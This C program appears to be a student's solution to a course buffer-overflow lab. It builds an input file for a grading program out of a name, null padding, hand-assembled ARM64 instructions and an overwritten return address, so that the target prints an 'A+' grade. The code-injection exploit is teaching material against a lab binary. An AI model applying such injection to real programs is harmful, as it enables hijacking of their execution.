#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "miniassembler.h"

int main(void)
{
    const char* name = "Tansha Vugarwal";
    int i;
    unsigned long ulReturnAddress = 0x420070;

    /* putchar('A') */
    unsigned int uiMovInstr1 = MiniAssembler_mov(0, 0x41); /* 24-27 */
    unsigned int uiBlInstr1 = MiniAssembler_bl(0x400490, 0x420070); /* 28-31 */

    /* grade = + */
    unsigned int uiMovInstr2 = MiniAssembler_mov(1, 0x002B); /* 32-35 */
    unsigned int uiAdrInstr = MiniAssembler_adr(2, 0x420044, 0x420078); /* 36-39 */
    unsigned int uiStrbInstr = MiniAssembler_strb(1, 2); /* 40-43 */
    
    /* Branch to printf("%c is your grade.\n", grade); */
    unsigned int uiBInstr = MiniAssembler_b(0x400864, 0x420080); /* 44 - 47 */

    FILE *psFile;

    psFile = fopen("dataAplus", "w");

    /* Printing out 15-character long name. */
    /* 0->14 */
    fprintf(psFile, "%s", name);
    
    /* 15->23 */
    for (i = 0; i < 9; i++)
    {
        putc('\0', psFile); /* Writes 00000000 */
    }

    fwrite(&uiMovInstr1, sizeof(unsigned int), 1, psFile);

    fwrite(&uiBlInstr1, sizeof(unsigned int), 1, psFile);

    fwrite(&uiMovInstr2, sizeof(unsigned int), 1, psFile);

    fwrite(&uiAdrInstr, sizeof(unsigned int), 1, psFile);

    fwrite(&uiStrbInstr, sizeof(unsigned int), 1, psFile);

    fwrite(&uiBInstr, sizeof(unsigned int), 1, psFile);
 

    fwrite(&ulReturnAddress, sizeof(unsigned long), 1, psFile);

    fclose(psFile);

    return 1;
}

